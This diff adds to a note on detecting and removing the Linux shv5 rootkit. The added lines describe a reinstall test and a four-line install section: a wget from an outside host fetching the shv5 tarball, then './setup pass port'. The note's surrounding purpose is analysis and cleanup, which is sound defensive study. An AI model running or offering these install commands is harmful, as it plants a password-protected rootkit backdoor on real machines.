@@ -19,6 +19,17 @@ The only reason you see this clue "Unknown HZ value" is because the rootkit repl
 Sad to say, but if this happens to you, its time to reinstall your OS!
 
 
+!!测试发现第一次安装shv5的时候,ls不会有出错信息,用脚本将rootkit清理一遍,当然不彻底,虽然rootkit失效了,但是有些残留.再次安装ls就会出现错误提示了.
+
+## shv5安装 ##
+
+	wget http://baributz.hourb.com/localroot/shv5.tar.gz
+	tar zxvf shv5.tar.gz
+	cd shv5
+	./setup pass port
+
+
+
 ## 参考资料 ##
 
 http://www.kentoyer.com/2009/12/21/removing-the-shv5-rootkit/
@@ -37,3 +48,5 @@ http://blog.evilcoder.net/remove-linux-shv5-rootkit/
 
 
 http://web.fhnw.ch/plattformen/ns/vorlesungsunterlagen-1/network-analysis-tools/shv4-analysis
+
+http://blog.csdn.net/cnbird2008/article/details/4553488
